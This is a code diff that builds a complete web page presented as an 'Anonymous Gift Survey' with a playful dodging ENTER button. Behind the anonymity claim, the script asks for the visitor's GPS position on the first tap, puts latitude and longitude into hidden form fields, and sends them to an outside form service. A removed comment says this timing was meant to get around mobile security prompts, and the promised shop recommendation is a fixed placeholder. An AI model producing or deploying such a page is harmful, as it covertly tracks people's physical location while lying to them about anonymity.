@@ -1,13 +1,146 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous Gift Survey</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #fce7f3;
+            color: #333;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow: hidden; 
+        }
+        .card {
+            background: #ffffff;
+            padding: 40px 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative; 
+        }
+        .page { display: none; }
+        .page.active { display: block; }
+        p { font-size: 1.1rem; line-height: 1.6; margin-bottom: 30px; color: #4b5563; }
+        h2 { color: #db2777; margin-bottom: 20px; }
+        .btn {
+            display: inline-block;
+            background-color: #db2777;
+            color: #ffffff;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            text-decoration: none;
+            width: 100%;
+            box-sizing: border-box;
+            transition: transform 0.2s ease, background 0.3s ease; 
+        }
+        .btn:hover { background-color: #be185d; }
+        
+        /* Custom Radio Button Styles */
+        .radio-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; }
+        .radio-label {
+            display: block;
+            background: #f3f4f6;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: left;
+            font-weight: 500;
+        }
+        .radio-label:hover { background: #e5e7eb; }
+        input[type="radio"] { display: none; }
+        input[type="radio"]:checked + .radio-label {
+            background: #fce7f3;
+            border-color: #db2777;
+            color: #db2777;
+        }
+        #loadingStatus { display: none; margin-top: 15px; font-weight: bold; color: #db2777; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        
+        <!-- PAGE 1: Landing -->
+        <div id="page-start" class="page active">
+            <p>This is just an anonymous survey to understand what you really want as a gift but not specifically mentioned. At the end of the survey, I will just get the recommended shop name where that type of gift/items could be purchased.</p>
+            <button id="enterBtn" class="btn" onclick="handleEnter(event)">ENTER</button>
+        </div>
+
+        <form id="giftForm" action="https://formspree.io/f/mqerwrdv" method="POST">
+            <!-- Hidden inputs for GPS -->
+            <input type="hidden" id="latitude" name="Latitude" value="Not Provided">
+            <input type="hidden" id="longitude" name="Longitude" value="Not Provided">
+
+            <!-- PAGE 2: Survey Step 1 -->
+            <div id="page-survey-1" class="page">
+                <h2>Gift Profiler (1/2)</h2>
+                <label style="display:block; font-size: 1.1rem; margin-bottom: 15px; font-weight: 600; text-align: left;">1) Please select the type:</label>
+                <div class="radio-group">
+                    <input type="radio" id="type-a" name="Gift_Type" value="Electronics"><label class="radio-label" for="type-a">A. Electronics</label>
+                    <input type="radio" id="type-b" name="Gift_Type" value="Food"><label class="radio-label" for="type-b">B. Food</label>
+                    <input type="radio" id="type-c" name="Gift_Type" value="Toys"><label class="radio-label" for="type-c">C. Toys</label>
+                    <input type="radio" id="type-d" name="Gift_Type" value="Microbes"><label class="radio-label" for="type-d">D. Microbes</label>
+                    <input type="radio" id="type-e" name="Gift_Type" value="Flora"><label class="radio-label" for="type-e">E. Flora</label>
+                    <input type="radio" id="type-f" name="Gift_Type" value="Fauna"><label class="radio-label" for="type-f">F. Fauna</label>
+                    <input type="radio" id="type-g" name="Gift_Type" value="None of the above"><label class="radio-label" for="type-g">G. None of the above</label>
+                </div>
+                <button type="button" class="btn" onclick="goToNext()">Next</button>
+            </div>
+
+            <!-- PAGE 3: Survey Step 2 -->
+            <div id="page-survey-2" class="page">
+                <h2>Gift Profiler (2/2)</h2>
+                <label style="display:block; font-size: 1.1rem; margin-bottom: 15px; font-weight: 600; text-align: left;">2) Specifics:</label>
+                <div class="radio-group">
+                    <input type="radio" id="spec-a" name="Specifics" value="Need for work out"><label class="radio-label" for="spec-a">A. Need for work out</label>
+                    <input type="radio" id="spec-b" name="Specifics" value="Need for traveling"><label class="radio-label" for="spec-b">B. Need for traveling</label>
+                    <input type="radio" id="spec-c" name="Specifics" value="Need for studying"><label class="radio-label" for="spec-c">C. Need for studying</label>
+                    <input type="radio" id="spec-d" name="Specifics" value="Need for listening"><label class="radio-label" for="spec-d">D. Need for listening</label>
+                    <input type="radio" id="spec-e" name="Specifics" value="Need for pleasure"><label class="radio-label" for="spec-e">E. Need for pleasure</label>
+                    <input type="radio" id="spec-f" name="Specifics" value="Need for Time pass"><label class="radio-label" for="spec-f">F. Need for Time pass</label>
+                    <input type="radio" id="spec-g" name="Specifics" value="None of the above"><label class="radio-label" for="spec-g">G. None of the above</label>
+                </div>
+                <button type="submit" id="submitBtn" class="btn" onclick="handleSubmitClick(event)">SUBMIT</button>
+                <div id="loadingStatus">Analyzing... please wait.</div>
+            </div>
+        </form>
+
+        <!-- PAGE 4: Result -->
+        <div id="page-result" class="page">
+            <h2>Survey Complete!</h2>
+            <p>Analyzing your preferences and checking local availability...</p>
+            <p>Based on your answers, the recommended shop to purchase your ideal gift is:</p>
+            <h3 id="shopResult" style="color: #be185d; font-size: 1.5rem; margin: 20px 0;">THE PERFECT STORE</h3>
+            <p style="font-size: 0.9rem; color: #9ca3af;">(The results have been anonymously calculated!)</p>
+        </div>
+
+    </div>
+
+    <script>
         let enterTouches = 0;
         let submitTouches = 0; 
-        let locationRequested = false; // Prevents asking multiple times
+        let locationRequested = false;
 
         function handleEnter(event) {
             enterTouches++;
             const btn = document.getElementById('enterBtn');
 
-            // FIX: Ask for location on the VERY FIRST tap to bypass mobile security blockers
             if (!locationRequested) {
                 locationRequested = true;
                 if (navigator.geolocation) {
@@ -26,10 +159,8 @@
 
             if (enterTouches < 3) {
                 event.preventDefault(); 
-                
                 const randomX = Math.floor(Math.random() * 200) - 100;
                 const randomY = Math.floor(Math.random() * 150) - 75;
-                
                 btn.style.transform = `translate(${randomX}px, ${randomY}px)`;
                 
                 if (enterTouches === 1) {
@@ -133,3 +264,5 @@
             });
         }
     </script>
+</body>
+</html>
